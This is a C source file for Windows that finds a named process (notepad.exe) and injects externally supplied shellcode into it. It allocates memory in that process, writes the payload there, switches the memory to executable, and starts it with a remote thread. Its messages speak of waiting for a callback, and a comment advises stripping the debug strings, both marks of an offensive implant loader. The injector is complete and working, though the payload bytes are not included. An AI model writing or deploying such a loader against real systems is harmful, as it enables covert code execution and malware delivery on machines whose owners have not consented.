#include "Shellcode.h"
/*
Externally defined shellcode variables:

{
    unsigned char shellcode[];
    unsigned int shellcode_size;
}

*/

#include <psapi.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <windows.h>

#define MAX_PROCESSES 1024
#define PROCESS_NAME_MAX_LENGTH MAX_PATH

DWORD findPID( const char *token ) {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;
    if ( !EnumProcesses( aProcesses, sizeof( aProcesses ), &cbNeeded ) ) {
        return 0;
    }
    cProcesses = cbNeeded / sizeof( DWORD );

    for ( i = 0; i < cProcesses; i++ ) {
        if ( aProcesses[i] != 0 ) {

            HANDLE hProcess = OpenProcess( PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, aProcesses[i] );

            if ( hProcess != NULL ) {
                HMODULE hMod;
                DWORD cbNeeded;
                if ( EnumProcessModules( hProcess, &hMod, sizeof( hMod ), &cbNeeded ) ) {
                    char szProcessName[MAX_PATH];
                    if ( GetModuleBaseNameA( hProcess, hMod, szProcessName, sizeof( szProcessName ) / sizeof( char ) ) ) {
                        if ( strcmp( szProcessName, token ) == 0 ) {
                            return aProcesses[i];
                        }
                    }
                }
            }
        }
    }
    return 0;
}

BOOL Inject( DWORD pid, const char *target, size_t shellcodeSize, const unsigned char *shellcode ) {
    HANDLE procHandle = OpenProcess( PROCESS_ALL_ACCESS, FALSE, pid );
    if ( procHandle == NULL ) {
        printf( "[-] Could not open process handle\n" );
        return FALSE;
    }

    LPVOID remoteMem = VirtualAllocEx( procHandle, NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE );
    if ( remoteMem == NULL ) {
        printf( "[-] Could not allocate memory in target process\n" );
        CloseHandle( procHandle );
        return FALSE;
    }
    printf( "[*] mem addr: %p\n", remoteMem );

    if ( !WriteProcessMemory( procHandle, remoteMem, shellcode, shellcodeSize, NULL ) ) {
        printf( "[-] Could not write shellcode to target process\n" );
        VirtualFreeEx( procHandle, remoteMem, 0, MEM_RELEASE );
        CloseHandle( procHandle );
        return FALSE;
    }

    DWORD oldProtect;
    if ( !VirtualProtectEx( procHandle, remoteMem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect ) ) {
        printf( "[-] Could not change memory protection to RX\n" );
        VirtualFreeEx( procHandle, remoteMem, 0, MEM_RELEASE );
        CloseHandle( procHandle );
        return FALSE;
    }

    printf( "[+] Changed memory protection to RX\n" );

    HANDLE hThread = CreateRemoteThread( procHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteMem, NULL, 0, NULL );
    if ( hThread == NULL ) {
        printf( "[-] Could not create remote thread\n" );
        VirtualFreeEx( procHandle, remoteMem, 0, MEM_RELEASE );
        CloseHandle( procHandle );
        return FALSE;
    }

    printf( "[+] Thread created, wait for callback\n" );

    WaitForSingleObject( hThread, INFINITE );
    CloseHandle( hThread );
    VirtualFreeEx( procHandle, remoteMem, 0, MEM_RELEASE );
    CloseHandle( procHandle );
    return TRUE;
}

/*
    [!] Remember to remove the print strings when you are done debugging
*/

int main( int argc, char *argv[] ) {
    const char *target = "notepad.exe";

    DWORD pid = findPID( target );
    if ( pid == 0 ) {
        printf( "[-] Could not find %s\n", target );
        return 1;
    }

    printf( "[+] Injecting %zu bytes of shellcode into %s\n", shellcode_size, target );

    if ( !Inject( pid, target, shellcode_size, shellcode ) ) {
        printf( "[-] Shellcode injection failed\n" );
        return 1;
    }

    return 0;
}